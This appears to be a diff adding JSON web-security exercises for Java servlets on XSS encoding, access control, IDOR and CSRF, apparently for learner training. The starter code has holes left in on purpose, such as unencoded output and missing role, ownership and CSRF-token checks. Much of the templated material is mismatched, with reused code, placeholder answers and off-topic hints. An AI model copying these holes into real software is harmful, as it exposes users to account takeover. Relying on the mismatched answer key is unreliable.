+          "starter_code": "// TODO: Fix ALL XSS issues in this code\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    // TODO: Add security headers here\n    \n    resp.setContentType(\"text/html\");\n    PrintWriter out = resp.getWriter();\n    \n    String productName = rs.getString(\"name\");\n    String reviewContent = rs.getString(\"content\");\n    String searchHighlight = req.getParameter(\"highlight\");\n    \n    out.printf(\"<h1>%s</h1>\", productName);        // Output 1\n    out.printf(\"<p>%s</p>\", reviewContent);           // Output 2\n    out.printf(\"<div>Search: %s</div>\", searchHighlight); // Output 3\n}",
+          "expected_output": "// Add CSP header\nresp.setHeader(\"Content-Security-Policy\", \"script-src 'self'; default-src 'self'\");\nresp.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n\n// Encode ALL outputs\nout.printf(\"<h1>%s</h1>\", htmlEncode(productName));\nout.printf(\"<p>%s</p>\", htmlEncode(reviewContent));\nout.printf(\"<div>Search: %s</div>\", htmlEncode(searchHighlight));",
+          "hints": [
+            {
+              "message": "Every output that contains user-influenced data needs htmlEncode(). Which of the three outputs could contain attacker-controlled content?"
+            },
+            {
+              "message": "ALL THREE could be dangerous: productName could be set by admin (what if admin is compromised?), reviewContent is user-generated, searchHighlight comes from URL parameter."
+            },
+            {
+              "message": "Fix all three with htmlEncode(). Add CSP header to block inline scripts as second defence. Add X-Content-Type-Options: nosniff to prevent MIME sniffing."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Identify the Missing Check",
+          "description": "Spot where authentication ≠ authorisation in this admin servlet.",
+          "difficulty": "beginner",
+          "category": "Access Control",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's examine access control! This exercise focuses on identify the missing check. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: Identify the Missing Check\n// Look at this admin endpoint and find the security gap.\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    if (session == null || session.getAttribute(\"userId\") == null) {\n        resp.sendRedirect(\"/login\");\n        return;\n    }\n    // TODO: What check is MISSING here?\n    renderAdminPage(out);\n}",
+          "expected_output": "See hints for detailed solution to: Identify the Missing Check",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Spot where authentication ≠ authorisation in this admin servlet."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Identify the Missing Check: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Add Role-Based Access Control",
+          "description": "Write a reusable isAdmin() method and apply it to the admin endpoint.",
+          "difficulty": "beginner",
+          "category": "Access Control",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's examine access control! This exercise focuses on add role-based access control. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: Add Role-Based Access Control\n// Look at this admin endpoint and find the security gap.\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    if (session == null || session.getAttribute(\"userId\") == null) {\n        resp.sendRedirect(\"/login\");\n        return;\n    }\n    // TODO: What check is MISSING here?\n    renderAdminPage(out);\n}",
+          "expected_output": "See hints for detailed solution to: Add Role-Based Access Control",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Write a reusable isAdmin() method and apply it to the admin endpoint."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Add Role-Based Access Control: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: Predict the Response — Customer vs Admin",
+          "description": "What HTTP status code and content should each user role see?",
+          "difficulty": "beginner",
+          "category": "Access Control",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's examine access control! This exercise focuses on predict the response — customer vs admin. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: Predict the Response — Customer vs Admin\n// Look at this admin endpoint and find the security gap.\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    if (session == null || session.getAttribute(\"userId\") == null) {\n        resp.sendRedirect(\"/login\");\n        return;\n    }\n    // TODO: What check is MISSING here?\n    renderAdminPage(out);\n}",
+          "expected_output": "See hints for detailed solution to: Predict the Response — Customer vs Admin",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. What HTTP status code and content should each user role see?"
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Predict the Response — Customer vs Admin: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Horizontal Access Control",
+          "description": "Customer1 can see customer2's orders by changing the URL parameter. Fix it.",
+          "difficulty": "intermediate",
+          "category": "Access Control",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's examine access control! This exercise focuses on horizontal access control. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: Horizontal Access Control\n// Fix the authorisation vulnerability in this endpoint.\n\n// Current code allows any logged-in user to access any order:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    int orderId = Integer.parseInt(req.getParameter(\"id\"));\n    ResultSet rs = getOrder(conn, orderId);  // No ownership check!\n    displayOrder(out, rs);\n}\n\n// TODO: Add ownership verification\n// The logged-in user's ID is in session.getAttribute(\"userId\")\n// The order has a user_id column",
+          "expected_output": "See hints for detailed solution to: Horizontal Access Control",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Customer1 can see customer2's orders by changing the URL parameter. Fix it."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Horizontal Access Control: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: IDOR — Insecure Direct Object Reference",
+          "description": "The order download uses sequential IDs. Write code to check ownership before serving.",
+          "difficulty": "intermediate",
+          "category": "Access Control",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's examine access control! This exercise focuses on idor — insecure direct object reference. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: IDOR — Insecure Direct Object Reference\n// Fix the authorisation vulnerability in this endpoint.\n\n// Current code allows any logged-in user to access any order:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    int orderId = Integer.parseInt(req.getParameter(\"id\"));\n    ResultSet rs = getOrder(conn, orderId);  // No ownership check!\n    displayOrder(out, rs);\n}\n\n// TODO: Add ownership verification\n// The logged-in user's ID is in session.getAttribute(\"userId\")\n// The order has a user_id column",
+          "expected_output": "See hints for detailed solution to: IDOR — Insecure Direct Object Reference",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. The order download uses sequential IDs. Write code to check ownership before serving."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for IDOR — Insecure Direct Object Reference: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: Role Hierarchy Design",
+          "description": "Design an access control matrix for: guest, customer, staff, admin roles.",
+          "difficulty": "intermediate",
+          "category": "Access Control",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's examine access control! This exercise focuses on role hierarchy design. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: Role Hierarchy Design\n// Fix the authorisation vulnerability in this endpoint.\n\n// Current code allows any logged-in user to access any order:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    int orderId = Integer.parseInt(req.getParameter(\"id\"));\n    ResultSet rs = getOrder(conn, orderId);  // No ownership check!\n    displayOrder(out, rs);\n}\n\n// TODO: Add ownership verification\n// The logged-in user's ID is in session.getAttribute(\"userId\")\n// The order has a user_id column",
+          "expected_output": "See hints for detailed solution to: Role Hierarchy Design",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Design an access control matrix for: guest, customer, staff, admin roles."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Role Hierarchy Design: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: API Endpoint Protection",
+          "description": "REST API endpoints lack access control. Add middleware-style checking.",
+          "difficulty": "intermediate",
+          "category": "Access Control",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's examine access control! This exercise focuses on api endpoint protection. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Access Control Exercise: API Endpoint Protection\n// Fix the authorisation vulnerability in this endpoint.\n\n// Current code allows any logged-in user to access any order:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    int orderId = Integer.parseInt(req.getParameter(\"id\"));\n    ResultSet rs = getOrder(conn, orderId);  // No ownership check!\n    displayOrder(out, rs);\n}\n\n// TODO: Add ownership verification\n// The logged-in user's ID is in session.getAttribute(\"userId\")\n// The order has a user_id column",
+          "expected_output": "See hints for detailed solution to: API Endpoint Protection",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. REST API endpoints lack access control. Add middleware-style checking."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for API Endpoint Protection: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Multi-Tenant Isolation",
+          "description": "Two companies share the same app. Ensure Company A can't see Company B's data.",
+          "difficulty": "advanced",
+          "category": "Access Control",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's examine access control! This exercise focuses on multi-tenant isolation. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Advanced Access Control: Multi-Tenant Isolation\n// This requires analysing multiple endpoints together.\n\n// Endpoint 1: /profile/view?id={userId}\n// Endpoint 2: /profile/edit (POST)\n// Endpoint 3: /admin/users\n// Endpoint 4: /admin/promote?userId={id}\n// Endpoint 5: /orders?userId={id}\n// Endpoint 6: /download?file={name}\n// Endpoint 7: /review (POST)\n// Endpoint 8: /search?q={query}\n\n// TODO: For each endpoint, assess:\n// 1. Does it check authentication? (login required?)\n// 2. Does it check authorisation? (role check?)\n// 3. Does it check ownership? (is this MY data?)\n// Rate each: SECURE / WEAK / NONE",
+          "expected_output": "See hints for detailed solution to: Multi-Tenant Isolation",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Two companies share the same app. Ensure Company A can't see Company B's data."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Multi-Tenant Isolation: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: Privilege Escalation Chain",
+          "description": "Find a chain of two low-severity issues that together allow admin access.",
+          "difficulty": "advanced",
+          "category": "Access Control",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's examine access control! This exercise focuses on privilege escalation chain. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Advanced Access Control: Privilege Escalation Chain\n// This requires analysing multiple endpoints together.\n\n// Endpoint 1: /profile/view?id={userId}\n// Endpoint 2: /profile/edit (POST)\n// Endpoint 3: /admin/users\n// Endpoint 4: /admin/promote?userId={id}\n// Endpoint 5: /orders?userId={id}\n// Endpoint 6: /download?file={name}\n// Endpoint 7: /review (POST)\n// Endpoint 8: /search?q={query}\n\n// TODO: For each endpoint, assess:\n// 1. Does it check authentication? (login required?)\n// 2. Does it check authorisation? (role check?)\n// 3. Does it check ownership? (is this MY data?)\n// Rate each: SECURE / WEAK / NONE",
+          "expected_output": "See hints for detailed solution to: Privilege Escalation Chain",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Find a chain of two low-severity issues that together allow admin access."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Privilege Escalation Chain: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Complete Access Control Audit",
+          "description": "Audit all 8 endpoints in the app and rate each one's access control as Secure/Weak/None.",
+          "difficulty": "advanced",
+          "category": "Access Control",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's examine access control! This exercise focuses on complete access control audit. Remember: authentication (who are you?) is NOT the same as authorisation (what can you do?). 🔐",
+          "starter_code": "// Advanced Access Control: Complete Access Control Audit\n// This requires analysing multiple endpoints together.\n\n// Endpoint 1: /profile/view?id={userId}\n// Endpoint 2: /profile/edit (POST)\n// Endpoint 3: /admin/users\n// Endpoint 4: /admin/promote?userId={id}\n// Endpoint 5: /orders?userId={id}\n// Endpoint 6: /download?file={name}\n// Endpoint 7: /review (POST)\n// Endpoint 8: /search?q={query}\n\n// TODO: For each endpoint, assess:\n// 1. Does it check authentication? (login required?)\n// 2. Does it check authorisation? (role check?)\n// 3. Does it check ownership? (is this MY data?)\n// Rate each: SECURE / WEAK / NONE",
+          "expected_output": "See hints for detailed solution to: Complete Access Control Audit",
+          "hints": [
+            {
+              "message": "Think about the difference between checking IF someone is logged in vs checking WHAT they're allowed to do. Audit all 8 endpoints in the app and rate each one's access control as Secure/Weak/None."
+            },
+            {
+              "message": "The key to access control: every endpoint must verify the user's ROLE and DATA OWNERSHIP, not just their login status."
+            },
+            {
+              "message": "Solution approach for Complete Access Control Audit: Check session.getAttribute('role') for vertical access control. Check that the requested resource belongs to the logged-in user for horizontal access control. Return 403 Forbidden for unauthorised access."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Identify Missing CSRF Protection",
+          "description": "Which forms in this app are vulnerable to CSRF? Check for hidden token fields.",
+          "difficulty": "beginner",
+          "category": "CSRF Protection",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about identify missing csrf protection. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: Identify Missing CSRF Protection\n// The profile update form:\n<form method=\"POST\" action=\"/shop/profile/edit\">\n    <input type=\"email\" name=\"email\" value=\"alice@example.com\">\n    <input type=\"text\" name=\"full_name\" value=\"Alice Johnson\">\n    <button type=\"submit\">Save Changes</button>\n</form>\n\n// TODO: What's missing from this form?\n// How would an attacker exploit this?",
+          "expected_output": "See hints for solution to: Identify Missing CSRF Protection",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For Identify Missing CSRF Protection: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Craft a CSRF Attack Page",
+          "description": "Write an HTML page that changes a user's email when they visit it.",
+          "difficulty": "beginner",
+          "category": "CSRF Protection",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about craft a csrf attack page. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: Craft a CSRF Attack Page\n// The profile update form:\n<form method=\"POST\" action=\"/shop/profile/edit\">\n    <input type=\"email\" name=\"email\" value=\"alice@example.com\">\n    <input type=\"text\" name=\"full_name\" value=\"Alice Johnson\">\n    <button type=\"submit\">Save Changes</button>\n</form>\n\n// TODO: What's missing from this form?\n// How would an attacker exploit this?",
+          "expected_output": "See hints for solution to: Craft a CSRF Attack Page",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For Craft a CSRF Attack Page: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Generate CSRF Tokens",
+          "description": "Implement token generation using UUID and store it in the session.",
+          "difficulty": "beginner",
+          "category": "CSRF Protection",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about generate csrf tokens. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: Generate CSRF Tokens\n// The profile update form:\n<form method=\"POST\" action=\"/shop/profile/edit\">\n    <input type=\"email\" name=\"email\" value=\"alice@example.com\">\n    <input type=\"text\" name=\"full_name\" value=\"Alice Johnson\">\n    <button type=\"submit\">Save Changes</button>\n</form>\n\n// TODO: What's missing from this form?\n// How would an attacker exploit this?",
+          "expected_output": "See hints for solution to: Generate CSRF Tokens",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For Generate CSRF Tokens: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Verify CSRF Token on Submit",
+          "description": "Write the server-side validation that checks the submitted token matches the session token.",
+          "difficulty": "intermediate",
+          "category": "CSRF Protection",
+          "estimated_minutes": 7,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about verify csrf token on submit. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: Verify CSRF Token on Submit\nimport java.util.UUID;\n\n// TODO: Implement CSRF token verification\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    \n    // Step 1: Get the expected token from session\n    String expected = null; // TODO\n    \n    // Step 2: Get the submitted token from form\n    String submitted = null; // TODO\n    \n    // Step 3: Compare them\n    // TODO: What should happen if they don't match?\n    \n    // Step 4: Process the form if valid\n    String email = req.getParameter(\"email\");\n    updateProfile(conn, userId, email);\n}",
+          "expected_output": "See hints for solution to: Verify CSRF Token on Submit",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For Verify CSRF Token on Submit: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: CSRF in JSON APIs",
+          "description": "Can CSRF work against a JSON API endpoint? Analyse fetch() vs form submission.",
+          "difficulty": "intermediate",
+          "category": "CSRF Protection",
+          "estimated_minutes": 7,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about csrf in json apis. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: CSRF in JSON APIs\nimport java.util.UUID;\n\n// TODO: Implement CSRF token verification\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    \n    // Step 1: Get the expected token from session\n    String expected = null; // TODO\n    \n    // Step 2: Get the submitted token from form\n    String submitted = null; // TODO\n    \n    // Step 3: Compare them\n    // TODO: What should happen if they don't match?\n    \n    // Step 4: Process the form if valid\n    String email = req.getParameter(\"email\");\n    updateProfile(conn, userId, email);\n}",
+          "expected_output": "See hints for solution to: CSRF in JSON APIs",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For CSRF in JSON APIs: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: SameSite Cookie Defence",
+          "description": "Configure session cookies with SameSite=Strict to prevent CSRF without tokens.",
+          "difficulty": "intermediate",
+          "category": "CSRF Protection",
+          "estimated_minutes": 7,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about samesite cookie defence. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: SameSite Cookie Defence\nimport java.util.UUID;\n\n// TODO: Implement CSRF token verification\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    \n    // Step 1: Get the expected token from session\n    String expected = null; // TODO\n    \n    // Step 2: Get the submitted token from form\n    String submitted = null; // TODO\n    \n    // Step 3: Compare them\n    // TODO: What should happen if they don't match?\n    \n    // Step 4: Process the form if valid\n    String email = req.getParameter(\"email\");\n    updateProfile(conn, userId, email);\n}",
+          "expected_output": "See hints for solution to: SameSite Cookie Defence",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For SameSite Cookie Defence: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: Double Submit Cookie Pattern",
+          "description": "Implement CSRF defence using the double-submit cookie technique.",
+          "difficulty": "intermediate",
+          "category": "CSRF Protection",
+          "estimated_minutes": 7,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about double submit cookie pattern. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// CSRF Exercise: Double Submit Cookie Pattern\nimport java.util.UUID;\n\n// TODO: Implement CSRF token verification\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    \n    // Step 1: Get the expected token from session\n    String expected = null; // TODO\n    \n    // Step 2: Get the submitted token from form\n    String submitted = null; // TODO\n    \n    // Step 3: Compare them\n    // TODO: What should happen if they don't match?\n    \n    // Step 4: Process the form if valid\n    String email = req.getParameter(\"email\");\n    updateProfile(conn, userId, email);\n}",
+          "expected_output": "See hints for solution to: Double Submit Cookie Pattern",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For Double Submit Cookie Pattern: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: CSRF + XSS Combo Attack",
+          "description": "If an app has both CSRF tokens AND XSS, how can XSS steal the CSRF token?",
+          "difficulty": "advanced",
+          "category": "CSRF Protection",
+          "estimated_minutes": 10,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about csrf + xss combo attack. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// Advanced CSRF: CSRF + XSS Combo Attack\n// Scenario: App has CSRF tokens but ALSO has an XSS vulnerability\n// The CSRF token is in a hidden field:\n// <input type=\"hidden\" name=\"csrf_token\" value=\"a7f3b2c1-...\">\n\n// TODO: Write an XSS payload that:\n// 1. Reads the CSRF token from the page\n// 2. Uses it to submit a form change\n// 3. Explain why CSRF tokens alone don't work if XSS exists\n\n// This demonstrates why you need BOTH XSS prevention AND CSRF tokens",
+          "expected_output": "See hints for solution to: CSRF + XSS Combo Attack",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For CSRF + XSS Combo Attack: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: CSRF Token Per-Request vs Per-Session",
+          "description": "Compare the security of generating tokens once per session vs once per request.",
+          "difficulty": "advanced",
+          "category": "CSRF Protection",
+          "estimated_minutes": 10,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about csrf token per-request vs per-session. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// Advanced CSRF: CSRF Token Per-Request vs Per-Session\n// Scenario: App has CSRF tokens but ALSO has an XSS vulnerability\n// The CSRF token is in a hidden field:\n// <input type=\"hidden\" name=\"csrf_token\" value=\"a7f3b2c1-...\">\n\n// TODO: Write an XSS payload that:\n// 1. Reads the CSRF token from the page\n// 2. Uses it to submit a form change\n// 3. Explain why CSRF tokens alone don't work if XSS exists\n\n// This demonstrates why you need BOTH XSS prevention AND CSRF tokens",
+          "expected_output": "See hints for solution to: CSRF Token Per-Request vs Per-Session",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For CSRF Token Per-Request vs Per-Session: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Complete CSRF Remediation",
+          "description": "Fix all forms in the application with proper CSRF protection.",
+          "difficulty": "advanced",
+          "category": "CSRF Protection",
+          "estimated_minutes": 10,
+          "ai_intro": "CSRF is a sneaky attack — let's learn about complete csrf remediation. The attacker never sees your password; they just ride on your session. 🎭",
+          "starter_code": "// Advanced CSRF: Complete CSRF Remediation\n// Scenario: App has CSRF tokens but ALSO has an XSS vulnerability\n// The CSRF token is in a hidden field:\n// <input type=\"hidden\" name=\"csrf_token\" value=\"a7f3b2c1-...\">\n\n// TODO: Write an XSS payload that:\n// 1. Reads the CSRF token from the page\n// 2. Uses it to submit a form change\n// 3. Explain why CSRF tokens alone don't work if XSS exists\n\n// This demonstrates why you need BOTH XSS prevention AND CSRF tokens",
+          "expected_output": "See hints for solution to: Complete CSRF Remediation",
+          "hints": [
+            {
+              "message": "CSRF works because browsers automatically send cookies with every request. The server can't tell if a request came from YOUR form or an attacker's form."
+            },
+            {
+              "message": "The fix is a secret token that the attacker can't guess. Only YOUR form has the correct token; the attacker's forged form doesn't."
+            },
+            {
+              "message": "For Complete CSRF Remediation: Generate with UUID.randomUUID().toString(), store in session, embed in form as hidden field, verify on POST before processing. If tokens don't match → 403 Forbidden."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Spot the Path Traversal",
+          "description": "Find the file access vulnerability in this download servlet.",
+          "difficulty": "beginner",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 5,
+          "ai_intro": "Security configuration matters! Let's work on spot the path traversal. Even one misconfigured endpoint can undo all other defences. 🔒",
